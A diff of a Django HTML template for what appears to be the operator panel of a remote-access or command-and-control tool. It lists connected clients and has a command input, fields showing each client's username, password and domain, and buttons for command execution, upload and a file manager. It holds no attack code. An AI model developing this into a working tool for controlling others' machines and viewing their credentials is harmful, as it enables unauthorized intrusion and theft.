@@ -7,18 +7,68 @@
           content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <link rel="stylesheet" href="{% static 'server_side/css/style.css' %}">
+    <link rel="stylesheet" href="{% static 'server_side/@flaticon/flaticon-uicons/css/regular/rounded.css' %}">
     <title>Server</title>
 </head>
 <body>
 <div class="container">
     <div id="clients">
+        <h1 id="clients-header">
+            Clients Name
+        </h1>
+        {% for client in clients %}
+        	<button id="btn{{ client.id }}">{{ client.id_name | upper }}</button>
+        {% endfor %}
+    </div>
+    <div id="cmd-form">
+        <form action="/" method="post">
+            {% csrf_token %}
+            <input type="text" name="command" placeholder="type your command..." class="cmd-input">
+            <input type="submit" name="cmd-btn" value="" class="cmd-submit">
+        </form>
 
     </div>
-    <div id="mainpart">
+    <div id="main">
+        <div id="overview-header">
+            <h1 id="overview">Client Name Overview</h1>
+        </div>
+
+        <div id="overview-content">
+            <div id="status">
+                <i class="fi fi-rr-siren-on"></i>
+                <h3 id="status-header">Status</h3>
+                <p id="status-text">Online</p>
+            </div>
+            <div id="username">
+                <i class="fi fi-rr-user"></i>
+                <h3 id="username-header">Username</h3>
+                <p id="username-text">username</p>
+            </div>
+            <div id="password">
+                <i class="fi fi-rr-lock-hashtag"></i>
+                <h3 id="password-header">Password</h3>
+                <p id="password-text">password</p>
+            </div>
+            <div id="domain">
+                <i class="fi fi-rr-network-analytic"></i>
+                <h3 id="domain-header">Domain</h3>
+                <p id="domain-text">domain</p>
+            </div>
+            <div id="last-seen">
+                <i class="fi fi-rr-clock"></i>
+                <h3 id="last-seen-header">Last Seen</h3>
+                <p id="last-seen-text">20 min</p>
+            </div>
+        </div>
 
     </div>
     <div id="functions">
-
+        <div class="functions-btn">
+        <button> <i class="fi fi-rr-ballot"></i>overview</button>
+        <button> <i class="fi fi-rr-command"></i>cmd exec</button>
+        <button><i class="fi fi-rr-cloud-upload"></i>upload</button>
+        <button><i class="fi fi-rr-folder"></i>file manager</button>
+        </div>
     </div>
 </div>
 </body>
